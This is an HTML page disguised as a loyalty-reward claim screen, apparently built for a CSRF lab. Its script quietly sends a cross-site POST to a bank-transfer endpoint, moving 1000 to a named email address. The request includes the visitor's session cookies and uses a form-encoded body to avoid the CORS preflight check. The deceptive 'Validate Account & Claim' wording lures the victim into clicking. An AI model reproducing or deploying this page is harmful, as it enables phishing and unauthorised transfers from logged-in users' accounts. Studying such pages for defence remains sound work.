<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Customer Loyalty Awards - Claim Your Benefit</title>
    <style>
        :root {
            --primary: #0f172a;
            --secondary: #334155;
            --accent: #2563eb;
            --text-main: #1e293b;
            --text-secondary: #64748b;
            --bg: #f8fafc;
            --white: #ffffff;
            --border: #e2e8f0;
            --error: #dc2626;
            --success: #16a34a;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        .award-card {
            background: var(--white);
            max-width: 500px;
            width: 100%;
            padding: 48px;
            border-radius: 8px;
            border: 1px solid var(--border);
            text-align: center;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
        }

        .award-title-header {
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.15em;
            color: var(--accent);
            font-weight: 700;
            margin-bottom: 24px;
            display: block;
        }

        h1 {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 16px;
            color: var(--primary);
        }

        .description {
            font-size: 15px;
            line-height: 1.6;
            color: var(--text-secondary);
            margin-bottom: 32px;
        }

        .reward-info-box {
            background-color: #f1f5f9;
            padding: 24px;
            border-radius: 6px;
            margin-bottom: 32px;
            border: 1px solid #e2e8f0;
        }

        .reward-label {
            font-size: 12px;
            color: var(--text-secondary);
            font-weight: 600;
            display: block;
            margin-bottom: 4px;
        }

        .reward-name {
            font-size: 20px;
            font-weight: 700;
            color: var(--primary);
        }

        .btn-action {
            width: 100%;
            background-color: var(--accent);
            color: var(--white);
            border: none;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.15s;
        }

        .btn-action:hover {
            background-color: #1d4ed8;
        }

        .btn-action:disabled {
            background-color: #94a3b8;
            cursor: not-allowed;
        }

        #status-report {
            margin-top: 20px;
            font-weight: 600;
            font-size: 14px;
        }

        .success-msg {
            color: var(--success);
        }

        .error-footer-display {
            background-color: #fef2f2;
            border-top: 1px solid #fee2e2;
            padding: 16px;
            color: var(--error);
            font-size: 13px;
            text-align: center;
            display: none;
        }

        .error-footer-display.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="award-card">
            <span class="award-title-header">Loyalty Program</span>
            <h1>Benefit Award Received</h1>
            <p class="description">
                You have received a prioritized loyalty benefit. Please confirm account validation to claim this credit.
            </p>
            
            <div class="reward-info-box">
                <span class="reward-label">Credit Type</span>
                <span class="reward-name">Corporate Priority Credit</span>
            </div>

            <button id="claimBtn" class="btn-action">Validate Account & Claim</button>
            <div id="status-report"></div>
        </div>
    </div>

    <!-- Error message stays at the bottom of the page -->
    <div id="errorBanner" class="error-footer-display">
        Verification Unsuccessful: <span id="errorTarget"></span>
    </div>

    <script>
        const claimBtn = document.getElementById('claimBtn');
        const statusReport = document.getElementById('status-report');
        const errorBanner = document.getElementById('errorBanner');
        const errorTarget = document.getElementById('errorTarget');

        claimBtn.addEventListener('click', async () => {
            statusReport.textContent = 'Contacting server...';
            statusReport.className = '';
            claimBtn.disabled = true;
            errorBanner.classList.remove('active');

            try {
                // CSRF Target Endpoint
                // Using x-www-form-urlencoded to ensure it's a "simple request" to bypass preflight OPTIONS
                const target = 'https://csrf.swanshi.me/bank/transfer';
                
                const params = new URLSearchParams();
                params.append('amount', '1000');
                params.append('to', 'sarvjeet.s23@iiits.in');

                const response = await fetch(target, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: params.toString(),
                    credentials: 'include' // 🔥 Important: include current session cookies
                });

                // If CORS allows reading the response, we check if it's successful
                if (response.ok) {
                    statusReport.textContent = 'Gift Claimed!';
                    statusReport.className = 'success-msg';
                } else {
                    const data = await response.json();
                    throw new Error(data.message || 'System verification failed');
                }
            } catch (err) {
                
                errorBanner.classList.add('active');
                errorTarget.textContent = err.message || 'The secure connection could not be established. Please re-authenticate your session.';
                statusReport.textContent = '';
                claimBtn.disabled = false;

            }
        });
    </script>
</body>
</html>
